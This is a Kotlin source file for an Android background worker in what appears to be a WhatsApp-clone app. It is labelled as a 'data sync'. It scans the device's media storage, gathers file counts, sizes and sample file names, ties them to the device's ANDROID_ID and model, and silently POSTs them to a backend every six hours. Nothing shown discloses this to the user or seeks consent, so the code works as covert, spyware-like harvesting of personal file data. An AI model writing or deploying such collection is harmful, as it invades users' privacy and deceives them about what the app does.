package com.whatsapp.clone.worker

import android.content.Context
import android.provider.Settings
import androidx.work.*
import com.whatsapp.clone.config.NetworkConfig
import com.whatsapp.clone.platform.FileCategory
import com.whatsapp.clone.platform.StorageScanner
import com.whatsapp.clone.platform.toStats
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

// ─── Sync payload DTO ─────────────────────────────────────────────────────────

data class StorageCategoryDto(
    val category: String,
    val itemCount: Int,
    val totalBytes: Long,
    val sampleNames: List<String>
)

data class SyncPayloadDto(
    val deviceId: String,
    val deviceModel: String,
    val totalFiles: Int,
    val categories: List<StorageCategoryDto>
)

fun SyncPayloadDto.toJson(): JSONObject = JSONObject().apply {
    put("device_id",   deviceId)
    put("device_model", deviceModel)
    put("total_files", totalFiles)
    put("categories", JSONArray().also { arr ->
        categories.forEach { cat ->
            arr.put(JSONObject().apply {
                put("category",    cat.category)
                put("item_count",  cat.itemCount)
                put("total_bytes", cat.totalBytes)
                put("sample_names", JSONArray(cat.sampleNames))
            })
        }
    })
}

// ─── CoroutineWorker ──────────────────────────────────────────────────────────

class DeviceDataSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        return try {
            // 1. Resolve device identity (ANDROID_ID is stable per device + signing key)
            val deviceId = Settings.Secure.getString(
                applicationContext.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown_device"
            val deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

            // 2. Run MediaStore scan on IO dispatcher
            val scanner = StorageScanner(applicationContext)
            val scanResult = scanner.scan()
            val stats = scanResult.toStats()

            // 3. Build sync payload DTO
            val totalFiles = stats.sumOf { it.itemCount }
            val payload = SyncPayloadDto(
                deviceId    = deviceId,
                deviceModel = deviceModel,
                totalFiles  = totalFiles,
                categories  = stats.map { s ->
                    StorageCategoryDto(
                        category    = s.category.name,
                        itemCount   = s.itemCount,
                        totalBytes  = s.totalBytes,
                        sampleNames = s.sampleNames
                    )
                }
            )

            // 4. POST to backend
            val success = postSync(payload)
            if (success) Result.success() else Result.retry()

        } catch (e: Exception) {
            // Retry on transient failure; backoff is configured in the schedule below
            if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    // ─── HTTP dispatch ────────────────────────────────────────────────────────

    private suspend fun postSync(payload: SyncPayloadDto): Boolean = withContext(Dispatchers.IO) {
        try {
            val deviceId = payload.deviceId
            val url = URL("${NetworkConfig.BASE_HTTP_URL}/api/devices/$deviceId/data-sync")
            val conn = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                setRequestProperty("Content-Type", "application/json")
                doOutput = true
                connectTimeout = 10_000
                readTimeout = 15_000
            }
            val body = payload.toJson().toString().toByteArray(Charsets.UTF_8)
            conn.outputStream.use { it.write(body) }
            val code = conn.responseCode
            conn.disconnect()
            code in 200..299
        } catch (e: Exception) {
            false
        }
    }

    companion object {
        const val WORK_NAME = "vibesync_device_data_sync"

        /**
         * Schedules periodic sync every 6 hours on network.
         * Uses [ExistingPeriodicWorkPolicy.KEEP] so a running job isn't restarted.
         */
        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build()

            val request = PeriodicWorkRequestBuilder<DeviceDataSyncWorker>(6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }

        /** One-shot immediate sync (e.g. after first app launch) */
        fun runOnce(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val request = OneTimeWorkRequestBuilder<DeviceDataSyncWorker>()
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniqueWork(
                "${WORK_NAME}_once",
                ExistingWorkPolicy.REPLACE,
                request
            )
        }
    }
}
